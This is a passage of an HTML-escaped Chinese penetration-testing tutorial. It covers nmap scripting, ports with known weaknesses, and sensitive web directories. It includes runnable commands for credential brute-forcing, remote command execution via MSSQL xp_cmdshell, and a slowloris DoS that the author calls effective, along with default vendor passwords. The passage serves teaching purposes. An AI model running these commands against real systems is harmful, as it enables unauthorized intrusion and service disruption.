style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=default 192.168.137.\\* 或者 nmap -sC 192.168.137.\\*&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/20.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script-vuln 192.168.1.1 #扫描是否有常见漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/21.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=broadcast 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;在局域网内探查更多服务开启状况\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.jpg&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script external 202.103.243.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;利用第三方的数据库或资源，例如进行whois解析&lt;/p&gt;\n&lt;h5 id=\&quot;应用扫描\&quot;&gt;应用扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#应用扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;ul&gt;\n&lt;li&gt;vnc扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=realvnc-auth-bypass 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 检查vnc认证方式&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=vnc-auth  192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 获取vnc信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=vnc-info 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;smb扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=smb-brute.nse 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# smb字典破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# smb已知的几个漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看共享目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 445 --script smb-ls--script-args ‘share=e\\$,path=\\\\,smbuser=test,smbpass=test’ 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#查询主机一些敏感信息（注：需要下载nmap_service）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看会话&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 系统信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;mssql扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 破解mssql用户名密码&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# xp_cmdshell 执行命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=\&quot;net user\&quot; 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;mysql扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 扫描root空口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap –p 3306 --script=mysql-empty-password.nse 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 列出所有mysql用户&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap –p 3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 支持同一应用的所有脚本扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=mysql-\\* 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;oracle扫描&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# oracle sid扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# oracle弱口令破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd192.168.137.5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;其它好用的脚本&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=broadcast-netbios-master-browser 192.168.137.4 发现网关&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module=www&#39; 192.168.137.4 破解rsync&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script informix-brute -p 9088 192.168.137.4 informix数据库破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -p 5432 --script pgsql-brute 192.168.137.4 pgsql破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sU --script snmp-brute 192.168.137.4 snmp破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV --script=telnet-brute 192.168.137.4 telnet破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=http-vuln-cve2010-0738 --script-args &#39;http-vuln-cve2010-0738.paths={/path1/,/path2/}&#39; &amp;#x26;lt;target&amp;#x26;gt; jboss autopwn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=http-methods.nse 192.168.137.4 检查http方法&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script http-slowloris --max-parallelism 400 192.168.137.4 dos攻击，对于处理能力较小的站点还挺好用的 &#39;half-HTTP&#39; connections&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;可查看脚本内容，查找脚本所调用的文件，并修改。&lt;/p&gt;\n&lt;h2 id=\&quot;常见危险端口对应的服务\&quot;&gt;常见危险端口对应的服务&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#常见危险端口对应的服务\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;20：FTP服务的数据传输端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;21：FTP服务的连接端口，可能存在  弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;22：SSH服务端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;23：Telnet端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;43：whois服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;53：DNS服务端口(TCP/UDP 53)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;67/68：DHCP服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;69：TFTP端口，可能存在弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;80：HTTP端口，常见web漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;110：POP3邮件服务端口，和SMTP的25端口对应&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;135：RPC服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;137/138： NMB服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;139：SMB/CIFS服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;143：IMAP协议端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;161/162: Snmp服务，public弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;389：LDAP目录访问协议，有可能存在注入、弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;443：HTTPS端口，心脏滴血等与SSL有关的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;512/513/514：Linux Rexec服务端口，可能存在爆破&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1080：socket端口，可能存在爆破&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1099：RMI，可能存在 RMI反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1433：SQL Server对外提供服务端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1521：oracle数据库端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2049：NFS服务端口，可能存在NFS配置不当&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2375：Docker端口，可能存在 Docker未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2601:   Zebra ，默认密码zebr&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3128:   squid ，匿名访问（可能内网漫游）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3306：MySQL数据库端口，可能存在 弱口令暴力破解&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4440：Rundeck，弱口令admin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4560：log4j SocketServer监听的端口，可能存在 log4j&amp;#x3C;=1.2.17反序列化漏洞（CVE-2019-17571）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5432：PostGreSQL数据库的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5632：PyAnywhere服务端口，可能存在代码执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;7180：Cloudera manager端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8080-8090：可能存在web服务&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9000：fastcgi端口，可能存在远程命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9043/9090：WebSphere，可能存在WebSphere反序列化漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;10000：Webmin-Web控制面板，可能存在弱口令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;60020：hbase.regionserver.port，HRegionServer的RPC端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;60030：hbase.regionserver.info.port，HRegionServer的http端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网站敏感目录和文件\&quot;&gt;网站敏感目录和文件&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站敏感目录和文件\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;后台目录：弱口令，万能密码，爆破&lt;/li&gt;\n&lt;li&gt;安装包：获取数据库信息，甚至是网站源码&lt;/li&gt;\n&lt;li&gt;上传目录：截断、上传图片马等&lt;/li&gt;\n&lt;li&gt;mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell&lt;/li&gt;\n&lt;li&gt;安装页面 ：可以二次安装进而绕过&lt;/li&gt;\n&lt;li&gt;phpinfo：会把你配置的各种信息暴露出来&lt;/li&gt;\n&lt;li&gt;编辑器：fck、ke、等&lt;/li&gt;\n&lt;li&gt;iis短文件利用：条件比较苛刻  windows、apache等&lt;/li&gt;\n&lt;li&gt;提到了网站敏感目录我们就不得不提 robots.txt 文件了&lt;/li&gt;\n&lt;li&gt;robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。\n假如编写的robots.txt文件内容如下：&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;User-agent: \\*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /data/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /db/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /admin/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Disallow: /manager/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Allow:/images/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/  即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。&lt;/p&gt;\n&lt;p&gt;虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。&lt;/p&gt;\n&lt;p&gt;探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等&lt;/p&gt;\n&lt;h2 id=\&quot;dirbuster\&quot;&gt;dirbuster&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#dirbuster\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Dirbuster是一种履带式和粗暴式的混合物; 它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。&lt;/p&gt;\n&lt;p&gt;为确定文件是否存在，DirBuster使用服务器的响应代码。最常见的响应如下所示：&lt;/p&gt;\n&lt;p&gt;200 ok：文件存在&lt;/p&gt;\n&lt;p&gt;404找不到404文件：服务器中不存在该文件&lt;/p&gt;\n&lt;p&gt;301 301永久移动：这是重定向到给定的URL&lt;/p&gt;\n&lt;p&gt;401 Unauthorized:访问此文件需要身份验证&lt;/p&gt;\n&lt;p&gt;403 